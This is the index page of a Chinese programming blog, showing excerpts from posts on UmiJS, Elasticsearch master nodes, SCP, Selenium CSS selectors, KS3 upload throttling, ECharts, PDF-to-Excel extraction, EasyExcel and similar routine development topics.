<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta name="generator" content="Hugo 0.121.1">
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>编程爱好者博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="编程爱好者博客">
		<meta property="og:title" content="编程爱好者博客" />
<meta property="og:description" content="编程爱好者博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="https://bchobby.github.io/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/index.xml" title="编程爱好者博客">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程爱好者博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程爱好者博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/aed71b7effe66417c465447fd8b8f49e/" rel="bookmark">
			值得收藏的UmiJS 教程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		点击上方关注 前端技术江湖，一起学习，天天进步
前言 网上的umi教程是真的少,很多人都只写了一点点，很多水文,所以打算自己写一篇,自己搭建umi,并封装了一下常用的功能,并用到公司实际项目中.
umi介绍 Umi 是什么？ Umi，中文可发音为乌米，是可扩展的企业级前端应用框架。Umi 以路由为基础的，同时支持配置式路由和约定式路由，保证路由的功能完备，并以此进行功能扩展。然后配以生命周期完善的插件体系，覆盖从源码到构建产物的每个生命周期，支持各种功能扩展和业务需求。
Umi 是蚂蚁金服的底层前端框架，已直接或间接地服务了 3000+ 应用，包括 java、node、H5 无线、离线（Hybrid）应用、纯前端 assets 应用、CMS 应用等。他已经很好地服务了我们的内部用户，同时希望他也能服务好外部用户。
它主要具备以下功能：
🎉 可扩展，Umi 实现了完整的生命周期，并使其插件化，Umi 内部功能也全由插件完成。此外还支持插件和插件集，以满足功能和垂直域的分层需求。
📦 开箱即用，Umi 内置了路由、构建、部署、测试等，仅需一个依赖即可上手开发。并且还提供针对 React 的集成插件集，内涵丰富的功能，可满足日常 80% 的开发需求。
🐠 企业级，经蚂蚁内部 3000+ 项目以及阿里、优酷、网易、飞猪、口碑等公司项目的验证，值得信赖。
🚀 大量自研，包含微前端、组件打包、文档工具、请求库、hooks 库、数据流等，满足日常项目的周边需求。
🌴 完备路由，同时支持配置式路由和约定式路由，同时保持功能的完备性，比如动态路由、嵌套路由、权限路由等等。
🚄 面向未来，在满足需求的同时，我们也不会停止对新技术的探索。比如 dll 提速、modern mode、webpack@5、自动化 external、bundler less 等等。
什么时候不用 umi？ 如果你，
需要支持 IE 8 或更低版本的浏览器
需要支持 React 16.8.0 以下的 React
需要跑在 Node 10 以下的环境中
有很强的 webpack 自定义需求和主观意愿
需要选择不同的路由方案
Umi 可能不适合你。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/aed71b7effe66417c465447fd8b8f49e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/81e6c3af2181acfa1e79fd90bcbee360/" rel="bookmark">
			android 传文件的同事带参数怎么操作?以及Map中多一对双引号的原因
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、安卓接口
@Multipart @POST("/video/upload") Observable&lt;ResponseBody&gt;pushVideo( @PartMap() Map&lt;String, RequestBody&gt; param,@Part MultipartBody.Part file); 二、Spring Boot端接口
public JSONResult upload(@RequestParam Map&lt;String, Object&gt; params, MultipartFile videoFile, HttpServletRequest request)
{
}
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e661ff3171d1319a9e6b042a0a964632/" rel="bookmark">
			把pdf转为高清jpg图片，其dpi为300以上
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 把pdf转为高清jpg图片，其dpi为300以上 在用latex写好伪代码后生成的pdf，想生成jpg格式，可以用如下方法
工具：Adobe Acrobat Pro DC
如果是：文件&gt;导出到&gt;图像
这样的图像dpi较小，有很重的锯齿感。
正确姿势：
1. 点击窗口右侧“导出PDF” 2. 选择图像 3. 电机JPEG右侧的齿轮，然后根据需求设置即可 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/429dccd49a355fd6a49018b4bd58f4fb/" rel="bookmark">
			Elasticsearch 集群中增加专用master节点
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 Elasticsearch 集群中增加专用master节点 文章目录 Elasticsearch 集群中增加专用master节点1.增加master节点2.排除原来的节点的选举权3.data节点重启操作4.删除exclusions ES版本 7.5.0
当前ES集群中有7个data+master节点，配置都比较高，集群的压力相对也比较大，所以计划加入3个专用的master节点，防止集群万一压力比较大的时候崩溃导致整个ES服务不可用。
操作过程
增加master节点排除原来的节点的选举权data节点重启操作删除exclusions 1.增加master节点 加入3个(2core+6G)的master节点。因为master节点只承担集群的元数据的管理和存储，所以对资源要求不高。 2.排除原来的节点的选举权 kibana console端将其他的data+master节点排除为可选举节点，参考
POST /_cluster/voting_config_exclusions/data2?timeout=1m POST /_cluster/voting_config_exclusions/data3?timeout=1m POST /_cluster/voting_config_exclusions/data4?timeout=1m 在这样操作完成后，新加入的节点中第一个就会成为真正的master
查看当前集群中有选举能力的节点和被剥夺选举能力的节点
GET /_cluster/state?filter_path=metadata.cluster_coordination GET _nodes/master:true 3.data节点重启操作 关闭集群的rebalance,并根据集群压力调整rebalance和allocation的并发度（后面恢复的时候使用）
PUT _cluster/settings { "transient" : { "cluster.routing.rebalance.enable" : "none", "cluster.routing.allocation.node_concurrent_recoveries":"1", "cluster.routing.allocation.cluster_concurrent_rebalance":"1" } } 执行Exclude 操作，将节点的数据去除（有时候节点数据过大有可能影响节点的重启），如果是数据分片是高可用的话，也可以直接关掉节点
PUT _cluster/settings { "transient" : { "cluster.routing.allocation.exclude._name" : "data2" } } 修改elasticsearch.yml配置文件，设置为master专用
node.master: false node.data: true 重启节点
4.删除exclusions 在全部的data节点重启完成后删掉原来的exclusions
DELETE _cluster/voting_config_exclusions?wait_for_removal=false 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d83bca92ac784b1081de39497db0d1c5/" rel="bookmark">
			一文读懂，为什么推荐采用嵌入式核心板开发产品？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、什么是核心板
嵌入式核心板又叫System-On-Module(SOM)板卡，是一种将CPU、内存（DDR）、存储（eMMC或FLASH）、电源管理（PMIC，负责CPU的上电时序及CPU需求各种不同电压的输出）等集成芯片封装到一起的高集成度板卡，一般采用板对板连接器、邮票孔焊接、金手指、COM Express等形式与底板连接，并且核心板通常将CPU的所有功能引脚或大部分功能引脚引出，用户在设计产品时只需进行功能接口的外围电路设计，从而降低硬件开发难度，节省开发时间。
在软件方面，嵌入式核心板（以下简称核心板）一般已完成Linux（Build Root）、Ubuntu、Android、WinCE等嵌入式操作系统的移植适配，在完善各个接口驱动的同时还会适配Uboot、文件系统以及QT图形界面的移植开发，这样最终呈现给用户的是一个带图形界面的完整操作系统，最大程度方便了用户进行二次开发。
核心板作为一种独特的嵌入式板卡形式，与一体板相比优势明显，不但可以降低产品设计难度，加快产品上市时间，同时还便于产品迭代升级，减少维护工作量，因此在嵌入式系统所涉及的产品领域得到广泛应用。对于一些经验丰富的软、硬件工程师来说，可能还不了解采用核心板的开发方式或者不信赖核心板的产品模式，所以每当遇到有新项目开发便重新开始设计一体板，软件上还要重新移植Uboot、操作系统、QT等。如果时间充足、经验丰富这种方法是可行的，但有很多公司在硬件与底层驱动上基础相对薄弱，一旦设计过程出现失误，很可能导致整个项目搁置，影响产品上市。在人力不足的情况下，这样的工作无疑是在“重复造轮子”，无形中消耗了大量的人力物力。
其实，飞凌嵌入式的核心板经过多年的技术发展与品质沉淀，在集成度、稳定性、专业性等方面已经非常成熟，飞凌的企业级板卡对于用户进行产品开发能带来很多价值。接下来，让我们从产品开发角度来进一步了解。
二、嵌入式ARM终端产品开发难点
嵌入式处理器应用已非常广泛，但在进行终端产品开发时，硬件设计、软件开发、和生产维护上却有一些无法规避的痛点。
01、
硬件设计痛点
▲ 设计难度大：随着嵌入式技术的发展，嵌入式处理器的性能越来越高，与之相对的是开发难度也越来越大，已不是单片机工程师软硬通吃的时代了。从SDRAM到LPDDR4，内存速率越来越快，PCB层数也从早期4层就可以满足到现在动辄8-12层，对高速走线与硬件的仿真都有了很大的要求，开发投入隐性成本高。
▲ 设计周期长：从熟悉CPU的启动、内存选配到电源架构设计，动辄几百根连线，一般需要半年以上的时间完成硬件设计与测试；后互联网时代对产品上市效率的要求很高，可谓“时间就是金钱”，市场不会因为设计难度停下来等你。
▲ 稳定性测试复杂：高低温测试、压力测试、信号完整性测试、电源带载测试、长期运行稳定性测试、频繁断电、上电开关机测试等都需要有完备的测试设备与经验方能完成。任何一个环节测试不通过都有可能让设计重新来过，增加了工程师的压力。
以上这些问题，如果使用飞凌核心板呢？
采用飞凌核心板方式设计产品，因高速信号走线全部集中在核心板层面，用户只需进行外围功能接口电路设计，使产品PCB层数从8-12层变为2-4层，极大简化硬件设计难度，降低开发周期。同时，针对核心模块的各种复杂测试已经由飞凌完成，测试成本也会大幅降低。
02、
软件设计的痛点
▲ 系统移植周期长：适配一个符合产品需求的操作系统，需要很长的开发周期。文件系统裁剪、文档解读、适配硬件、BUG调试，种种工作无疑加大了开发难度，也延长了开发周期；
▲ 重复开发：企业在有不同的产品研发项目时，会根据产品的特性选择不同品牌或型号的嵌入式处理器，这些处理器的性能和价格不同。如果使用同一款处理器开发不同产品可能会发生性能过剩或者性能不足的情况，但是如果每个项目都选择不同型号的处理器开发又会出现重复开发和精力不足的问题。重要的是，终端产品企业的软件研发精力更适合投入到应用程序的开发，与硬件相关的kernel层需要随着处理器的变化而更改；
以上这些问题，如果使用飞凌核心板呢？
飞凌核心板的操作系统BSP包都是经过优化、修复、裁剪、测试之后输出的，使用习惯、功能特性体现、稳定性方面都更加符合用户需求。用户不再需要从芯片原厂几百G的资料一步一步做出符合自己功能需要的BSP，只需要从飞凌提供的已搭建好的开发环境按照软件手册操作即可，不但节省了开发周期，还能让用户的精力更加集中于应用程序的开发。
03、生产与维护的痛点
▲ 生产良率的控制难：嵌入式处理器开发的产品PCB层数多，且多数是高速信号，对PCB材质、物料品质、焊接质量要求很高，如果达不到生产的一致性会直接导致良品率的下降甚至会造成板卡在现场不稳定的情况。
▲ 产品维护周期长：高速信号对PCB阻抗要求高，材质的细微变化都很可能会导致内存参数的调整。加之一些行业的产品生命周期很长，动辄十年以上，过程中任何一个芯片的停产或更新都需要软硬件驱动的修改，虽然难度不大但始终都要有人维护，分散精力。
以上这些问题，如果使用飞凌核心板呢？
因为处理器、内存、存储以及电源管理等主要芯片都集成在核心板上，而飞凌所有核心板在出厂前都会经过严格的老化和测试，保证交付给用户的是合格的产品，所以从侧面提升了用户的产品稳定性，降低其生产难度。因为处理器、内存、存储等芯片生产工艺在不断更新迭代，软件更新在所难免，飞凌为了保证核心板的一致性，会不断对核心板进行维护升级，这也间接帮助用户减少了维护成本和精力投入。
结束语
医疗、工控、交通、电力、物联网···不同行业、不同产品对嵌入式处理器的需求不同，有的需求高性能，有的需求低成本，有的需求功能接口丰富。在嵌入式处理器百花齐放的市场，飞凌与NXP、全志、瑞芯微、TI、SAMSUNG、瑞萨等国内外多家芯片原厂达成战略合作关系，针对不同嵌入式处理器的特性推出了一系列核心板，既有专用网络加速的NXP DN产品处理器核心板，也有多媒体通用处理器核心板；既有可稳定运行于医疗设备及工业现场的核心板，也有符合电力系统的全国产化核心板，省去了不同行业用户因不同项目需求开发多款板卡的麻烦。而稳定可靠的嵌入式核心板，在产品研发阶段，带来的不只是研发难度的降低，研发周期的缩短，长远看还能节约产品批量化后的隐性成本。这也是为什么越来越多的企业选择使用核心板来开发产品，因为，对于工程师和企业主来说，既省心省力，还能让产品更稳定。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/907f1e6a8194dc211c022a7a49c7d53b/" rel="bookmark">
			SCP 命令实验
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 SCP 命令 参考资料：https://linuxtools-rst.readthedocs.io/zh_CN/latest/tool/scp.html
上传： 上传文件 scp /Users/liweiwei1419/app/nacos-server-1.4.1.tar.gz root@192.168.47.128:/opt 上传文件夹 scp -r /Users/liweiwei1419/Downloads/2-基本命令 root@192.168.47.128:/opt 下载： 1. 把虚拟机里面的文件下载到本地 Mac 电脑（复制一个文件） 注意：复制一个文件
scp root@192.168.47.128:/opt/jdk-17_linux-x64_bin.tar.gz /Users/liweiwei1419/Downloads/下载/ 2. 把虚拟机里面的文件下载到本地 Mac 电脑（复制文件夹） 注意：递归复制文件夹（-r 参数）
scp -r root@192.168.47.128:/opt/jdk-17 /Users/liweiwei1419/Downloads/下载/ 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b7a17ef01c5c22a6df3c0b4e5e06493f/" rel="bookmark">
			Unity3D网络游戏实战——深入了解TCP，解决暗藏问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 前言 这一章基本属于科普章节，相信看到这篇文章的人也学习过计算机网络，所以很多基础知识，比如三握四挥这些就不多说了。
5.3常用TCP参数 5.3.1ReceiveBufferSize 指定了操作系统读缓冲区的大小，默认值8192。缓冲区满了，发送端会暂停发送数据，较大的缓冲区可以减少发送短暂停的概率，提高效率。
5.3.2SendBufferSize 指定操作系统写缓冲区的大小，默认值也是8192，设定的大一点也比较好~
5.3.3NoDelay 默认情况TCP会使用Nagle算法发送数据，因为TCP/IP协议会给用户数据添加一些头部信息。比如hello，加上IP头部和TCP头部分别20Byte，就是45Byte。但是如果分开发h/e/l/l/o就是205Byte。
Nagle算法就是不会立马发送数据，而是积攒到了一定数量再将其组成一个较大的数据报发送。
5.3.4TTL 表示一个IP数据包的能够经过的最大路由器跳数，防止在网络中无限循环和收发。如果偏远地区经常收不到，就socket.ttl=较大的数字
5.3.5ReuseAddress 端口复用，可以让同一个端口被多个socket使用。可以用于重启服务器的时候使用。
5.3.6LingerState 设置套接字保持连接的时间。如果设为0，就会一直等到数据发完才关闭连接。设为10，就等10s再关闭。
但是过多的TIME_WAIT会占用系统资源，有时候需要快速释放资源。
5.4Close的恰当时机 LingerState可以让程序在关闭连接前发完系统缓冲区的数据，但是这不代表能将所有数据发送出去。
比如我们自己定义的writeQueue，就算开启LigerState仍然会丢失数据。
所以我们要用一个isClosing标志位来判断是否还有正在发送的数据，如果没有再调用socket.Close()
5.5异常处理 对于大部分的Socket API，需要将它们放在try-catch结构里面
心跳机制 TCP有一个连接检测机制，如果在指定时间内没有数据传送，会给对端发送一个信号，对端收到后，回送一个信号。如果一段时间内没有收到对方的响应，就进行重试，重试几次后，会认为网络不通，关闭socket。
游戏开发中，TCP的KeepAlive机制很鸡肋，因为一段时间往往代表着2小时。所以我们一般自己实现心跳机制，每隔1分钟向服务端发送PING消息，服务端收到后回应PONG消息，如果很久没有回应就关闭连接。
缺点：
在短暂的故障期内，引起良好连接被释放。PING和PONG消息占用了不必要的宽带会让玩家花更多流量 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/487cfb10094eb85bbe0f9a2767492f1a/" rel="bookmark">
			【转】selenium之css定位
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		selenium之css定位
实在记不住，烂笔头就记一下吧。
一. 单一属性定位
1：type selector
driver.find_element_by_css_selector(‘input’)
2：id 定位
driver.find_element_by_css_selector(’#kw’)
3：class 定位
driver.find_element_by_css_selector(’.s_ipt’)
4：其他属性定位
driver.find_element_by_css_selector(’[name=‘wd’]’)
driver.find_element_by_css_selector("[type=‘text’]")
二.组合属性
1：id组合属性定位
driver.find_element_by_css_selector(“input#kw”)
2：class组合属性定位
driver.find_element_by_css_selector(“input.s_ipt”)
3：其他属性组合定位
driver.find_element_by_css_selector(“input[name=‘wd’]”)
4：仅有属性名，没有值也可以
driver.find_element_by_css_selector(“input[name]”)
5：两个其他属性组合定位
driver.find_element_by_css_selector("[name=‘wd’][autocomplete=‘off’]")
三.模糊匹配属性值的方法
1&gt;匹配属性包含so关键字字符串的元素，以符号 * 指明需要模糊匹配。
driver.find_element_by_css_selector(“input[class *=‘so’]”)
2&gt;匹配属性值为字符串开头的方法
driver.find_element_by_css_selector(“input[class^=‘btn’]”)
3&gt;匹配属性值字符串结尾的方法
driver.find_element_by_css_selector(“input[class$=‘s_btn’]”)
四.层级定位
1：父子层级定位元素
driver.find_element_by_css_selector(‘form#form&gt;span&gt;input’)#id是form的form下面的span下面的input
2：伪类定位元素
driver.find_element_by_css_selector(’#u_sp&gt;a :nth-child(1)’)#id为u_sp的下面的第一个a标签。
-在冒号前一定要有空格，否则就定位不到期望的元素 -
3：E :nth-last-child(n)，如字面意思：倒数第几个标签
4：E :first-child,第一个标签
5：E :last-child,最后一个标签
6：E :only-child,唯一的标签
五.兄弟同级元素
1.driver.find_element_by_css_selector(“div#div1&gt;input + a”)
2.driver.find_element_by_css_selector(“div#div1&gt;input + a + img”)
3.driver.find_element_by_css_selector(“div#div1&gt;input + * + img”)
4.driver.find_element_by_css_selector(“ul#recordlist&gt;p~li”)
六.多元素选择器，CSS定位方式支持多元素选择器，也就是一次可以同时选择多个相同的标签，也可以同时选择多个不同的标签，不同标签间用用英文的逗号(,)隔开。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/487cfb10094eb85bbe0f9a2767492f1a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8eba4861893cbf46f687eea4ffe67f94/" rel="bookmark">
			ks3云存储本地上传限速
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		貌似python sdk中没有这一项，使用jar工具配置文件的maxNetThroughput解决
参考
https://docs.ksyun.com/documents/895
下载解压
wget https://ks3tools-online.ks3-cn-beijing.ksyuncs.com/tools/release/KS3-import-tool-2.1.5-dist.zip 编写配置文件
taskName=hanguptool threadsNum=10 # 选项包括：local/ url / ks3 / oss / bos / qiniu /upyun /aws /cos / azure srcType=local #srcType=local时，AK/SK为空即可，如果填写则会被系统忽略 srcAccessKey= srcSecretKey= # 源endpoint，srcType=local时为空即可，如果填写则会被系统忽略 srcDomain= srcBucket= #若srcType为local，此处应填上传文件的绝对路径，文件夹请以/结尾 srcPrefix=必填 dstAccessKey=必填 dstSecretKey=必填 # 目标endpoint dstDomain=必填 dstBucket=必填 dstPrefix=local/ # (KB/s) &lt;0 表示不设限 maxNetThroughput=20480 # 文件权限:Private/PublicRead cannedAcl=Private # 该参数仅当srcType=ks3,oss,cos时有效。该参数为true时，会将源KS3对象的ACL复制到目标对象上，且cannedAcl选项将会被忽略。 useSrcAcl=false # 存储类型:STANDARD/STANDARD_IA/ARCHIVE storageType=STANDARD #该参数为true时，在start模式下且源站是ks3 会对比scr&lt;-&gt;dst的md5 一致时跳过上传。 skipDstExistFile=false #过滤器开关 filterEnable=false #url文件支持range下载 urlRangeDownload=true #文件名字包含的子符,多个用逗号分隔 fileNameInclude= #文件名字不包含的子符,多个用逗号分隔 fileNameExclude= #文件修改时间范围,以#分割，时间格式为yyyy-MM-dd HH:mm:ss， 如2005-01-12 00:00:00#2016-01-12 00:00:00 modifyTimeRange= #是否开启https useHttps =true #使用分块上传配置 #分块上传文件阈值,大于该值,使用分块传输 singleFileSize=209715200 #分块大小 partSize=104857600 #单文件文件分块传输并发数 uploadPartPoolSize=5 #增量模式 单位秒 incrementalMode=false incrementalModeInterval=900 #使用分时限流配置 # (KB/s) &lt;0 表示不设限 #不在区间内的速度为maxNetThroughput # maxNetThroughputRange= 1000#2000#3000 # maxNetThroughputTimeRange= 11:50:00-15:48:50#15:49:00-15:49:50#15:50:00-15:51:50 运行
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8eba4861893cbf46f687eea4ffe67f94/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bbf966971b94a11dfa194fc54664056f/" rel="bookmark">
			打开wireshark后没有接口解决办法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		打开wireshark后没有接口解决办法 现象如下
管理员身份运行cmd，重启NPF（Netgroup Packet Filter 网络数据包过滤器）服务
然后再用管理员身份运行wireshark，可以看到出现了所有网卡设备
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c4efa854d0f7ae117eabbab6c558c410/" rel="bookmark">
			看完 Python3.10 的新特性，我决定仍不更新
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Python3.10 在 2021 年的 10 月 3 号发布，目前已经过去 1 个月了，关于它的新特性相信大家已经有所耳闻，不过我决定仍然不更新，目前我在用的版本是 Python3.8，没有任何不爽。下面说一说我不更新的理由。
第一、相关的库可能还未跟进 如果你更新到了最新版本，已有的代码能否在不修改的情况下仍然可以正常运行？是首先要考虑的问题。
Python 的第三方库都是基于开源志愿者的劳动，他们免费做着非常有价值的工作，而且适配新的 Python 版本都需要时间。此外，由于升级涉及许多不同的群体，协调和发布需要更多时间。
第二、很多新特性没使用价值 盘点一下 Python3.10 的那些没什么用的新特性（个人观点，可以留言来喷）：
1、with 可以加括号了 比如：
with ( CtxManager1() as example1, CtxManager2() as example2, CtxManager3() as example3, ): ... 这一点，我基本用不到，也不清楚什么样的情况需要这样写。要是有多个上下文，我就串着多写几个就是了，要是 example1 和 example2 有关系，我可以嵌套：
with CtxManager1() as example1: with CtxManager2() as example2: ... ... 这样写不是层次更清晰吗？
2、match case 就是花花肠子 Python3.10 新增了 match 和 case 软关键字。什么是软关键字？就是虽然是关键字，但是可以作为变量名，虽然如此，你肯定也不愿意让 match 成为你的变量名了，因为这样也是不会报错的：
match match: #后一个 match 是变量名称 case case: &lt;action&gt; 3.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c4efa854d0f7ae117eabbab6c558c410/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e86d3d1761a5aebaedf0787d9350f6a0/" rel="bookmark">
			echarts 散点图
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		echarts 散点图 官网：Documentation - Apache ECharts
******************** 配置属性
option = { xAxis: { data: ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'] }, yAxis: {}, series: [ { type: 'scatter', //type: scatter表示散点图 data: [220, 182, 191, 234, 290, 330, 310] } ] }; 基本属性
id：组件id，默认不指定 name：系列名称 type：series图表类型，常用值：bar（柱形图）、line（折线图）、pie（饼图）、scatter（散点图） colorBy: series（同一系列颜色相同）、data（同一维度颜色相同） legendHoverLink：鼠标滑过时legend（图标）是否高亮，默认true coordinateSystem：series使用的坐标系，可选值（cartesian2d，直角坐标系，默认）、polar（极坐标系） cursor：鼠标悬浮时的鼠标样式 xAxisIndex：x轴的index，单个图表实例中有多个x轴时使用 yAxisIndex：y轴的index，单个图表实例中有多个y轴时使用 polarIndex：极坐标轴index，单个图表实例中有多个polar时使用 geoIndex：地理坐标系的index，单个图表实例中存在多个地理坐标系时使用 calendarIndex：日历坐标系的index，单个图表实例中存在多个日历坐标系时使用 symbol：标记的图形，可选值：circle、emptyCircle、rect、roundRect、image://url、path://等 symbilSize：标记大小 symbolRotate：标记的旋转角度 symbolKeepAspect：symbol为path://时，是否在缩放时保持长宽比，默认false symbolOffset：标记偏移量，如：[0,0] large：是否开启大数据量优化，默认false largeThreshold：开启绘制优化的阈值，默认2000 progressive：渐进式渲染时每一帧绘制图形数量，0表示不启用渐进式渲染，默认400 progressiveThreshold：启用渐进式渲染的图形数量阈值，默认2000 dimensions：数据维度 encode：数据映射规则 seriesLayoutBy：数据映射方式，可选值：column（默认）、row datasetIndex：数据集索引 dataGroupId：数据组id data：series中使用的数据，一般在数据集（dataset）中设置数据，实现数据与配置分离 clip：是否裁剪超出坐标系部分的图形 zlevel：柱状图所有图形的zlevel值，用于canvas分层，数值大的在上面 z：柱状图组件的所有图形的z值，数值大的在上面，优先级比zlevel低 silent：图形是否不响应和触发鼠标事件，默认false（响应并且触发鼠标事件） 动画属性
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e86d3d1761a5aebaedf0787d9350f6a0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/745ae8485bc0c911710cbf2be442fd80/" rel="bookmark">
			办公自动化：轻松提取PDF页面数据，并生成Excel文件（代码实战）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		发现网上有专门做文档格式转换的网站，不过是要充会员才可以。今天来做一篇PDF转换成Excel文档的代码实战，希望大佬喜欢，哈哈，话不多说，马上进入实战环节。
【阅读全文】
首先，我们一如既往的介绍一下需要用到的第三方库。
import pdfplumber # 专门处理PDF文档格式的文件对象 import pandas as pd # 数据处理库，常见的DtaFrame、Series数据对象处理 然后，再把相应的PDF数据提取出来并且保存在DataFrame数据对象中。
# 打开PDF文件、得到PDF数据文件对象 pdf_obj = pdfplumber.open('data.pdf') # 这里我们以获取第一页的PDF数据为例 page_1 = pdf_obj.pages[0] # 从得到的第一页数据中提取表格数据 data_table = page_1.extract_table() # 将提取到的数据表格转换为DataFrame数据对象 data_frame = pd.DataFrame(data_table) # 打印查看DataFrame数据 print(data_frame) 得到DataFrame数据对象之后，需要进行数据处理的话可以参考前面的文章DataFrame数据处理相关的知识点。
最后，将准备好的DataFrame数据对象保存成Excel格式的数据文件就大功告成啦。
writer = pd.ExcelWriter('C:\\data.xlsx') # 设置文档路径 data_frame.to_excel(writer, index=None, startrow=1, encoding='utf-8',sheet_name='数据统计') # 设置Excel对象 ws = writer.sheets['数据统计'] # 写入工作表名称 ws.write_string(0, 0, '我是一个标题') # 添加标题 writer.save() # 保存 【往期精彩】
● sched 模块中巨好用的轻量级定时任务神器scheduler！
● 不用再使用命令行打包成exe，有人写出了UI应用，可视化UI界面对python程序进行打包的方法！
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/745ae8485bc0c911710cbf2be442fd80/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4612935561dfc55373cc97bb27289591/" rel="bookmark">
			「Java工具类」EasyExcelUtil工具类 excel导入导出工具类 阿里EasyExcel简单封装新版强大不再需要poi
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		介绍语
本号主要是Java常用关键技术点，通用工具类的分享；以及springboot+springcloud+Mybatisplus+druid+mysql+redis+swagger+maven+docker等集成框架的技术分享；datax、kafka、flink等大数据处理框架的技术分享。文章会不断更新，欢迎码友关注点赞收藏转发！
望各位码友点击关注，冲1000粉。后面会录制一些视频教程，图文和视频结合，比如：图书介绍网站系统、抢购系统、大数据中台系统等。技术才是程序猿的最爱，码友们冲啊
如果码友觉得代码太长，可以从头到尾快速扫射一遍，了解大概即可。觉得有用后再转发收藏，以备不时之需。
正文：
excel导入导出工具类，今天整理出来了，看了下项目中用的居然还是1.x版本，整理时升级到easyexcel 3.0.2最新版本，没想到之前封装的一堆代码都不需要，现在这个版本太好用了。大家可以直接使用easyexcel的方法，封装多一层是为了项目更方便使用而已。
例子1 读测试
@Test public void readTest(){ // 读取测试 String readFile = "D:\\Workspace\\IdeaProjects\\jtool-common\\student信息表2.xlsx"; List&lt;Student&gt; data = EasyExcelUtil.read(readFile, Student.class); printList(data); } private static void printList(List&lt;?&gt; datas) { int i = 0; for (Object ob : datas) { System.out.println(i++ + "=&gt;" + ob); } } ​ // 控制台打印 17:55:58.240 [main] INFO - 解析完成！读取10行 0=&gt;Student(name=张1, age=12, address=深圳0栋大楼, birthday=Wed Nov 03 12:17:46 GMT+08:00 2021) 1=&gt;Student(name=张1, age=13, address=深圳1栋大楼, birthday=Wed Nov 03 12:17:46 GMT+08:00 2021) 2=&gt;Student(name=张1, age=14, address=深圳2栋大楼, birthday=Wed Nov 03 12:17:46 GMT+08:00 2021) 3=&gt;Student(name=张1, age=15, address=深圳3栋大楼, birthday=Wed Nov 03 12:17:46 GMT+08:00 2021) 4=&gt;Student(name=张1, age=16, address=深圳4栋大楼, birthday=Wed Nov 03 12:17:46 GMT+08:00 2021) 5=&gt;Student(name=张1, age=17, address=深圳5栋大楼, birthday=Wed Nov 03 12:17:46 GMT+08:00 2021) 6=&gt;Student(name=张1, age=18, address=深圳6栋大楼, birthday=Wed Nov 03 12:17:46 GMT+08:00 2021) 7=&gt;Student(name=张1, age=19, address=深圳7栋大楼, 